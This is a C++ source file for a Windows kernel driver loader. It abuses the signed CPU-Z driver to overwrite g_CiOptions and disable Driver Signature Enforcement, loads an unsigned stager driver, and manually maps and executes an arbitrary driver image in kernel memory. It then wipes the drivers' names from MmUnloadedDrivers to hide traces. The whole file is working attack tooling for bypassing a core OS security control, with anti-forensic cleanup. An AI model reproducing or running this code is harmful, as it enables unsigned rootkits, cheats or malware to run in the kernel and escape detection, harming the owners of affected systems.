#include <Windows.h>

#include <iostream>
#include <filesystem>
#include <fstream>
#include <wchar.h>

#include "cpuz_based_loader.h"

#include <tools/dsefix-cpuz/CpuzDseFix.h>
#include <tools/dsefix-cpuz/PdbHelper.h>
#include <pkn/core/driver_control/DriverLoader.h>
#include <pkn/core/injector/injector.hpp>
#include <pkn/core/remote_process/ProcessUtils.h>
#include <pkn/core/driver_control/PknDriver.h>
#include <pkn/core/pe_structure/PEStructure.hpp>
#include <../km/crt/assert.h>

using namespace pkn;
using namespace std;

void usage(const wchar_t *exe)
{
    printf("usage : \n");
    printf("%S service_name sys_path\n", exe);
    exit(1);
}

void pause(const char *prompt = "proess enter to continue")
{
    std::string s(prompt);
    cout << prompt;
    if (s.back() != '\n')
        cout << endl;
    system("pause > null");
}

std::optional<std::vector<uint8_t>> readfile(const estr_t &path)
{
    std::ifstream f(path.to<std::wstring>().c_str(), std::ifstream::binary);
    if (f.is_open())
    {
        f.seekg(0, std::ifstream::end);
        auto size = f.tellg();
        f.seekg(0, std::ifstream::beg);
        std::vector<uint8_t> buf(size);
        f.read((char *)&buf[0], size);
        return buf;
    }
    return std::nullopt;
}

void print_bytes(void *address, size_t size)
{
    auto *p = (unsigned char *)address;
    for (int i = 0; i < size; i++)
    {
        printf("%06x: ", i);
        for (int j = 0; j < 16; j++)
        {
            printf("%02x ", p[i]);
        }
        printf("\n");
    }
}

std::wstring a2w(const char *src)
{
    std::mbstate_t state = std::mbstate_t();
    size_t len;
    auto err = mbsrtowcs_s(&len, nullptr, 0, &src, 0, &state);
    if (err == 0)
    {
        std::wstring w(len, 0);
        if (0 == mbsrtowcs_s(&len, &w[0], len, &src, len, &state))
            return w;
    }
    return std::wstring();
}

std::optional<std::pair<erptr_t, erptr_t>> init_unloaded_drivers_rvas()
{
    PdbHelper pdb_ntoskrnl;
    erptr_t MmUnloadedDrivers;
    erptr_t MmLastUnloadedDriver;
    if (!pdb_ntoskrnl.init(make_estr("C:\\Windows\\system32\\ntoskrnl.exe"), make_estr("pdb")))
        return std::nullopt;

    // try to get rva for MmUnloadedDrivers & MmLastUnloadedDriver 
    // - for MmUnloadedDrivers
    if (auto res = pdb_ntoskrnl.symbol_address(make_estr("MmUnloadedDrivers")); res)
        MmUnloadedDrivers = (rptr_t)*res;
    else
        return std::nullopt;
    // - for MmLastUnloadedDriver
    if (auto res = pdb_ntoskrnl.symbol_address(make_estr("MmLastUnloadedDriver")); res)
        MmLastUnloadedDriver = (rptr_t)*res;
    else
        return std::nullopt;
    return std::make_pair(MmUnloadedDrivers, MmLastUnloadedDriver);
}

int move_rest_unloaded_driver(PknDriver &driver, erptr_t MmUnloadedDrivers, erptr_t MmLastUnloadedDriver, const wchar_t * pattern)
{
    printf("going to delete unloaded driver : %ls\n", pattern);
    if (auto res = driver.delete_unloaded_drivers(MmUnloadedDrivers,
                                                  MmLastUnloadedDriver,
                                                  pattern
    ); !res)
    {
        printf("[-] unknown error: failed to delete unloaded drivers for %ls!\n", pattern);
        return 1;
    }
    else
    {
        size_t ndeleted = *res;
        printf("[%s] %zd unloaded drivers names deleted(%ls)!\n", ndeleted > 0 ? "+" : "-", ndeleted, pattern);
    }
    return 0;
}

int exec(const wchar_t *driver2load)
{
    auto path = std::filesystem::absolute(driver2load).wstring();
    SingletonInjector<ProcessUtils>::set(new ProcessUtils);
    auto &pu = SingletonInjector<ProcessUtils>::get();

    DriverLoader cpuz_guard(make_estr("cpuz"), make_estr("cpuz.sys"));
    if (!cpuz_guard.load())
    {
        printf("[-] failed to load cpuz driver");
        return 1;
    }


    cpuz::CpuzDsefix dsefix;
    if (!dsefix.init())
    {
        printf("[-] failed to initialize dsefix utils");
        return 1;
    }
    printf("ci addr : %llx\n", (rptr_t)dsefix.ci);
    printf("ntoskrnl addr : %llx\n", (rptr_t)dsefix.ntoskrnl);
    printf("g_CiOptions rva : %llx\n", (rptr_t)dsefix.CiOptions);
    printf("g_CiEnabled rva : %llx\n", (rptr_t)dsefix.CiEnabled);
    printf("target address: %llx\n", (rptr_t)dsefix.target_address);
    printf("target value: 0x%llx\n", (rptr_t)dsefix.target_value);
    pause("Press enter to try to peek original value.");
    if (auto res = dsefix.read(); !res)
    {
        printf("failed to read!\n");
        return 1;
    }
    else
    {
        printf("original value: 0x%llx\n", (rptr_t)*res);
    }

    pause("Press enter to disable DSE.");
    if (!dsefix.disable())
    {
        printf("[-] failed to disable DSE\n");
        return 1;
    }
    printf("[+] DSE disabled\n");
    printf("original value : 0x%02llx\n", (rptr_t)dsefix.org_value);
    printf("new value : 0x%02llx\n", (rptr_t)dsefix.target_value);

    DriverLoader stager_guard(make_estr("pkn"), make_estr("pknkrnl.sys"));
    if (!stager_guard.create())
    {
        printf("[-] failed to create service for StepLoader\n");
        return 1;
    }

    auto reg = stager_guard.registry();
    estr_t device_name = make_estr("StepLoader");
    if (!reg.set<estr_t>(make_estr("DriverName"), make_estr("StepLoader")))
    {
        printf("[-] faield to write DriverName into registry\n");
        return 1;
    }
    if (!reg.set<estr_t>(make_estr("DeviceName"), device_name))
    {
        printf("[-] faield to write DeviceName into registry\n");
        return 1;
    }
    printf("[+] Names for stager written to registry\n");

    pause("Press enter to load Stager\n");
    if (!stager_guard.load())
    {
        printf("[-] faield to load stager. Is your system too noew? if so, contact author plz!\n");
        return 1;
    }
    printf("[+] stager driver loaded \n");

    if (!dsefix.enable())
    {
        printf("[-] failed to restore DSE, system may crash soon.\n");
    }

    PknDriver stager;
    if (!stager.open(device_name.to_wstring().c_str()))
    {
        printf("[-] failed to open deivce : %ls\n", device_name.to_wstring().c_str());
        return 1;
    }
    printf("[+] stager driver opened\n");

    std::vector<uint8_t> data;
    if (auto res = readfile(driver2load); !res)
    {
        printf("[-] failed to open file %ls", driver2load);
    }
    else
    {
        data = *res;
    }

    RawPEStructure64 s(&data[0]);
    s.parse();
    uint64_t image_size = s.image_size();
    vector<char> local_image(image_size);
    char *local_image_base = &local_image[0];
    s.load_as_image(local_image_base);

    // todl: ImagePeStructure64::fromRawData()
    ImagePEStructure64 image_info(local_image_base);
    image_info.parse();

    auto ntdll = LoadLibraryW(make_estr("ntoskrnl.exe").to_wstring().c_str());
    auto ntdllbase = (uint64_t)ntdll;

    if (auto res = pu.kernel_modulei("ntoskrnl.exe"); !res)
    {
        printf("[-] Failed to find ntoskrnl module!\n");
        return 1;
    }
    else
    {
        printf("[+] ntoskrnl module found!\n");
        auto nt = *res;
        vector<uint8_t> nt_data(nt.size);
        printf("nt base : %llx\n", (rptr_t)nt.base);
        printf("nt size : %llx\n", (rptr_t)nt.size);


        pause("press enter to map Driver.");
        if (auto res = stager.allocate_nonpaged_memory(image_size); !res)
        {
            printf("[-] Failed to allocate system memory!\n");
            return 1;
        }
        else
        {
            auto mapped_base = *res;
            printf("[+] system memory allocated : %llx\n", rptr_t(mapped_base));
            image_info.relocation(mapped_base);
            image_info.resolve_imports(
                [&](const std::string &dll, const char *proc)
                {
                    assert(compile_time::run_time::hash((estr_t(dll))) == make_hash("ntoskrnl.exe"));
                    auto dllva = (uint64_t)GetProcAddress(ntdll, proc);
                    auto rva = dllva - ntdllbase;
                    auto target = rva + nt.base;
                    return target;
                });

            printf("[+] imports resolved\n");
            if (auto res = stager.write_system_memory(mapped_base, image_size, local_image_base); !res)
            {
                printf("[-] failed to write system memory\n");
                return 1;
            }
            else
            {
                auto nwritten = *res;
                printf("image written into system memory\n");
                if (nwritten != image_size)
                {
                    printf("image size (%llx) != nwritten (%llx)\n", image_size, nwritten);
                }
            }

            printf("running read test...\n");
            vector<uint8_t> test_buff(image_size);
            if (auto res = stager.read_system_memory(mapped_base, image_size, &test_buff[0]); !res)
            {
                printf("[-] failed to read remote address\n");
                return 1;
            }
            else
            {
                if (*res != image_size)
                {
                    printf("[-] warning : size read is not equal to image_size\n");
                }
                if (memcmp(local_image_base, &test_buff[0], image_size) == 0)
                {
                    printf("[+] read test passed!\n");
                }
                else
                {
                    printf("[-] read test failed!\n");
                    printf("local : \n");
                    print_bytes(local_image_base, 0x30);
                    printf("remote : \n");
                    print_bytes(&test_buff[0], 0x30);
                    return 1;
                }
            }

            pause("press enter to run Driver.");
            if (auto res = stager.run_driver_entry(image_info.entry_point_rva() + mapped_base, 0, 0); !res)
            {
                printf("[-] unknown errro!\n");
                return 1;
            }
            else
            {
                if (uint32_t retv = (uint32_t)*res; !NT_SUCCESS(retv))
                {
                    stager.free_nonpaged_memory(mapped_base);
                    printf("[-] driver mapped but intialize failed with status : %x\n", retv);
                    if (retv != 0xc0000035)
                    {
                        return 1;
                    }
                    else
                    {
                        printf("[*] status c0000035: that driver might be already loaded.\n");
                    }
                }
                else
                {
                    printf("[+] driver mapped and intialize success with status : %x\n", retv);
                }


                pause("press enter to unload cpuz");
                dsefix.close();
                printf("device closed\n");
                if (!cpuz_guard.unload())
                {
                    printf("[-] Error: cpuz driver failed to unload, please restart your computer mamually\n");
                    pause();
                    return 1;
                }
                else
                {
                    printf("[+] CPUZ driver unloaded!\n");
                }

                pause("press enter to unload Stager");
                stager.close();
                printf("device closed\n");
                if (!stager_guard.unload())
                {
                    printf("[-] Error: stager failed to unload, please restart your computer mamually\n");
                    return 1;
                }
                else
                {
                    printf("[+] Stager unloaded!\n");
                }

                printf("do you want to delete unloaded drivers? yes/no\n");

                string s;
                cin >> s;
                if (s.empty() || tolower(s[0] != 'y'))
                    return 0;
                printf("deleting unloaded drivers.\n");
                PknDriver driver;
                if (!driver.open())
                {
                    printf("[-] Failed to open mapped driver!\n");
                    return 1;
                }
                erptr_t MmUnloadedDrivers;
                erptr_t MmLastUnloadedDriver;

                if (auto res = init_unloaded_drivers_rvas(); !res)
                {
                    printf("failed to fetch rvas for unloaded drivers!\n");
                    return 1;
                }
                else
                {
                    MmUnloadedDrivers = res->first;
                    MmLastUnloadedDriver = res->second;
                    printf("MmUnloadedDrivers rva : %llx\n", (rptr_t)MmUnloadedDrivers);
                    printf("MmLastUnloadedDriver rva : %llx\n", (rptr_t)MmLastUnloadedDriver);
                }

                if (MmUnloadedDrivers == 0 || MmLastUnloadedDriver == 0)
                {
                    printf("[-] fetch necessary rva failed, are u connected to the internet?\n");
                    return 1;
                }

                if (auto retv = move_rest_unloaded_driver(driver, MmUnloadedDrivers, MmLastUnloadedDriver, cpuz_guard.driver_filename().to_wstring().c_str()))
                    return retv;
                if (auto retv = move_rest_unloaded_driver(driver, MmUnloadedDrivers, MmLastUnloadedDriver, stager_guard.driver_filename().to_wstring().c_str()))
                    return retv;
                return 0;
            }
        }
    }
    return 1;
}

int wmain(int argc, wchar_t **argv)
{
    if (argc < 2)
        usage(argv[0]);

    atexit([]()
           {
               pause();
           });

    return exec(argv[1]);
}
